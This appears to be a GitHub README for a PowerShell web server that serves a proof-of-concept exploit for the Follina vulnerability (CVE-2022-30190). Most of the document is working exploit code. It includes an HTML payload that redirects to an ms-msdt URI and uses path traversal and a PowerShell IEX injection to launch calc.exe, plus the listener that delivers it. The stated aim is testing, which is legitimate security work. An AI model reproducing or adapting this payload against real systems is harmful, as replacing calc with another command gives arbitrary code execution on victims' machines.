# Follina Web Server

Simple PowerShell web server to assist in POC Follina testing by popping calc. 
When running, by default URL can be accessed via: http://localhost:8081/payload.html

References:

https://github.com/JMousqueton/PoC-CVE-2022-30190 - Good resource on creating your own POC
https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/creating-powershell-web-server - Base code for powershell web server


```powershell
# enter this URL to reach PowerShell's web server
$url = 'http://localhost:8081/'

# HTML content for some URLs entered by the user
$htmlcontents = @{
############# GET /payload.html (to pop calc)
"GET /payload.html"  =  @'    
<!doctype html>
<html lang="en">
<body>
<script>
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times
  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
</script>

</body>
</html>
'@;
############# GET / (Root)
'GET /' = @'   
<!doctype html>
<html lang="en">
<body>
Webserver OK
</body>
</html>
'@
}

# -------------------------------------
# start web server
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

try
{
  while ($listener.IsListening) {  
    # process received request
    $context = $listener.GetContext()
    $Request = $context.Request
    $Response = $context.Response

    $received = '{0} {1}' -f $Request.httpmethod, $Request.url.localpath
    
    # is there HTML content for this URL?
    $html = $htmlcontents[$received]
    if ($html -eq $null) {
      $Response.statuscode = 404
      $html = 'Oops, the page is not available!'
    } 

    Write-Output "Receiving request for $received"
    # return the HTML to the caller
    if ($Request.httpmethod -ne "HEAD") {        
        $buffer = [Text.Encoding]::UTF8.GetBytes($html)
    } else {
        $buffer = ""
    }
    $Response.ContentLength64 = $buffer.length
    $Response.OutputStream.Write($buffer, 0, $buffer.length)

    
    $Response.Close()
  }
}
finally
{
  $listener.Stop()
}
```


